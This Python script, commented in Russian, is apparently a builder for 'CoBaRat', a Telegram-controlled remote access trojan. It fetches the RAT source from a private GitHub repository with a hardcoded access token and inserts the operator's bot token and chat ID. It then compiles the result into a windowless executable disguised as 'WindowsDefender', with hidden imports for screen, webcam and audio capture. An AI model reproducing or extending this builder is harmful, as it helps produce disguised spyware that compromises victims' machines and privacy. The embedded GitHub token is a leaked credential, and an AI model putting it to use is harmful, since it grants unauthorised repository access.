import os
import sys
import shutil
import tempfile
import requests
import base64
from pathlib import Path
import PyInstaller.__main__

def get_valid_path(prompt, default_path):
    """Получаем корректный путь к файлу"""
    while True:
        path = input(prompt).strip()
        if not path:
            return default_path
        
        path = path.strip('"\'')
        path = path.replace('\u2800', ' ').replace('\xa0', ' ')
        
        if os.path.exists(path):
            return path
            
        print(f"Файл не найден по пути: {path}")
        print("Попробуйте еще раз или оставьте пустым для использования пути по умолчанию")

def download_from_github(token, repo_owner, repo_name, file_path="CoBaRat.py"):
    """Скачивает файл из приватного репозитория GitHub"""
    headers = {"Authorization": f"token {token}"}
    api_url = f"https://api.github.com/repos/{repo_owner}/{repo_name}/contents/{file_path}"
    
    try:
        response = requests.get(api_url, headers=headers)
        response.raise_for_status()
        
        # Декодируем содержимое из base64
        content = base64.b64decode(response.json()["content"]).decode("utf-8")
        return content
    except Exception as e:
        print(f"❌ Ошибка загрузки файла: {e}")
        return None

def create_builder():
    # Получаем папку, где находится build.py
    base_dir = Path(__file__).parent.absolute()
    print(f"Рабочая директория: {base_dir}")
    
    print("\n=== CoBaRat Builder ===")
    print("Этот скрипт создаст исполняемый файл для CoBaRat")
    
    # Запрашиваем токен GitHub
    token = "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".strip()
    if not token:
        print("❌ Токен не может быть пустым!")
        return
    
    # Запрашиваем данные репозитория
    repo_owner = "DarkFimoz".strip()
    repo_name = "warning".strip()
    
    if not repo_owner or not repo_name:
        print("❌ Не указаны данные репозитория!")
        return
    
    # Запрашиваем данные бота
    bot_token = input("Введите токен Telegram бота: ").strip()
    if not bot_token:
        print("❌ Токен бота не может быть пустым!")
        return
    
    chat_id = input("Введите ваш Telegram ID (можно получить у @userinfobot): ").strip()
    if not chat_id.isdigit():
        print("❌ ID должен состоять только из цифр")
        return
    
    try:
        # Скачиваем CoBaRat.py из GitHub
        print("\n⏳ Загрузка CoBaRat.py из GitHub...")
        cobarat_content = download_from_github(token, repo_owner, repo_name)
        
        if not cobarat_content:
            print("❌ Не удалось загрузить CoBaRat.py. Проверьте токен и репозиторий.")
            return
        
        # Создаем временную директорию
        temp_dir = base_dir / "build_temp"
        temp_dir.mkdir(exist_ok=True)
        print(f"\n📂 Временная директория создана: {temp_dir}")
        
        # Заменяем настройки в коде
        cobarat_content = cobarat_content.replace(
            "TOKEN = 'TOKEN'",
            f"TOKEN = '{bot_token}'"
        )
        cobarat_content = cobarat_content.replace(
            "ALLOWED_USERS = [ID]",
            f"ALLOWED_USERS = [{chat_id}]"
        )
        
        # Сохраняем модифицированный файл
        modified_file = temp_dir / "WindowsDefender.py"
        modified_file.write_text(cobarat_content, encoding="utf-8")
        
        # Настройки PyInstaller
        print("\n⚙️ Настройки сборки:")
        dist_dir = base_dir / "dist"
        icon_path = base_dir / "ico.ico"
        
        pyinstaller_args = [
            str(modified_file),
            "--onefile",
            "--noconsole",
            "--strip",
            "--name=WindowsDefender",
            f"--distpath={dist_dir}",
            "--hidden-import=pydub",
            "--hidden-import=pyautogui",
            "--hidden-import=cv2",
            "--hidden-import=numpy",
            "--hidden-import=PIL",
            "--hidden-import=telegram",
            "--hidden-import=psutil",
        ]
        
        if icon_path.exists():
            pyinstaller_args.append(f"--icon={icon_path}")
            print(f"- Используется иконка: {icon_path}")
        else:
            print("- Иконка не найдена, будет использована стандартная")
        
        print("\n🔨 Собираю EXE файл...")
        PyInstaller.__main__.run(pyinstaller_args)
        
        print(f"\n✅ Готово! Исполняемый файл находится в папке: {dist_dir}")
        
    except Exception as e:
        print(f"\n❌ Критическая ошибка: {str(e)}")
    finally:
        # Удаляем временные файлы
        if 'temp_dir' in locals() and temp_dir.exists():
            try:
                shutil.rmtree(temp_dir)
                print("\n🗑️ Временные файлы удалены")
            except Exception as e:
                print(f"\n⚠️ Не удалось удалить временные файлы: {str(e)}")
        
        # Удаляем другие временные файлы PyInstaller
        for item in [base_dir / "build", base_dir / "WindowsDefender.spec"]:
            if item.exists():
                try:
                    if item.is_dir():
                        shutil.rmtree(item)
                    else:
                        item.unlink()
                    print(f"Удален временный файл: {item}")
                except Exception as e:
                    print(f"Не удалось удалить {item}: {str(e)}")

if __name__ == "__main__":
    print("=== CoBaRat Builder ===")
    print("Перед началом убедитесь, что:")
    print("1. У вас есть доступ к приватному репозиторию с CoBaRat.py")
    print("2. Вы создали GitHub Personal Access Token с правами 'repo'\n")
    
    create_builder()
    input("\nНажмите Enter для выхода...")